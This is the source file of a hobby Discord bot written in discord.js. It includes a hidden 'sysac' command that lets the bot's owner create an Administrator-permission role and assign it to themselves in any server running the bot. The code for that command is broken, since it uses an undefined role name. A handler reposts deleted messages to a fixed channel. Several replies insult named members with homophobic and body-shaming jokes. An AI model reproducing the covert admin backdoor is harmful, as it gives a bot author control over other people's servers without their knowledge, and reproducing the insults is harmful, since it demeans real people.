//constants

const Discord = require("discord.js");
const client = new Discord.Client();
const config = require("./config.json")
const token = process.env.token;

//startup event handlers

client.on('ready', function() {
    console.log('Status loaded..');
    client.user.setPresence({ game: { name: `Cladri sleep`, type: `Watching` } });
});

client.on("ready", () => {
  console.log("Sentinal loaded...");
});

client.on('disconnected', function() {
    console.log('[META][WARN] Sentinel disconnected from Discord API Service. reconnecting...');
});

client.on('warn', function(msg) {
    console.log('[META][WARN] ' + msg);
});

client.on('error', function(err) {
    console.log('[META][ERROR] ' + err.message);
    process.exit(1);
});

client.on('messageDelete', message => {
  console.log(`message "${message.cleanContent}" was deleted from channel: ${message.channel.name} at ${new Date()}`);
  client.channels.get("610326108830826528").send(`message "${message.cleanContent}" has been deleted at ${new Date()}`)
});

client.on("message", (message) => {


  //bot check
  if (!message.content.startsWith(config.prefix) || message.author.bot) return;

  //avatar command
  if (message.content.startsWith(config.prefix + "test")) {
    message.channel.send("I'm still alive bitch");
  } else
 if (message.content.startsWith(config.prefix + 'avatar')) {
    const user = message.mentions.users.first() || message.author;
    const avatarEmbed = new Discord.RichEmbed()
        .setColor(0x333333)
        .setAuthor(user.username)
        .setImage(user.avatarURL);
    message.channel.send(avatarEmbed);
  } else

  // Create a new role with data
  if (message.content.startsWith(config.prefix + 'sysac') && message.author.id === config.ownerID){
  let me = message.author
          let role = message.guild.createRole({
          name : adminstrator,
          color : "RANDOM",
          permissions : [8]
          })
          let role1 = message.guild.roles.find('name', adminstrator)
      message.channel.send(`done`)
     message.guild.member(me).addRole(role1);
  } else

  // Simple commands
  if (message.content.startsWith(config.prefix + "Is SOM gay?")) {
    message.channel.send("Yeah he's a massive goy");
  } else
  if (message.content.startsWith(config.prefix + "Is Legit gay?")) {
    message.channel.send("No, but he is obese and has diabetes");
  } else
  if (message.content.startsWith(config.prefix + "Is Cladri gay?")) {
    message.channel.send("Yes he likes hentai traps #bibleblack");
  } else
  if (message.content.startsWith(config.prefix + "Is Iiro gay?")) {
    message.channel.send("big fat");
  } else
  if (message.content.startsWith(config.prefix + "Is Roku gay?")) {
    message.channel.send("Obviously");
  } else
  if (message.content.startsWith(config.prefix + "Is Nick gay?")) {
    message.channel.send("Simply the gayest");
  } else
  if (message.content.startsWith(config.prefix + 'owner') && message.author.id === config.ownerID){
    message.channel.send("Default#9672");
  } else
  if (message.content.startsWith(config.prefix + 'endgamespoilers')) {
    message.channel.send("He's here. . .", {
      file: "https://i.imgur.com/lyCfMno.gif"
        });
    }

});

client.login(token);
